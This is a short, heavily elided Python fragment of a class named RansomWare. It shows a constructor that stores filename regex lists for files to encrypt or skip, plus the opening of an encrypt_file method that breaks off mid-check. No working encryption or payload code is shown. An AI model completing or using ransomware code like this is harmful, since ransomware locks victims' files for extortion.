...
class RansomWare:
    ...
    def __init__(
        ...
        self.regexs_filename_to_encrypt = regexs_filename_to_encrypt
        self.regexs_filename_dont_encrypt = regexs_filename_dont_encrypt
    ...
    def encrypt_file(self, filename: str, key: bytes) -> None:
        ...
        if self.regexs_filename_to_encrypt:
            for regex in self.regexs_filename_to_encrypt:
                result = match(regex, filename)
                if result:
                    break
            if not result:
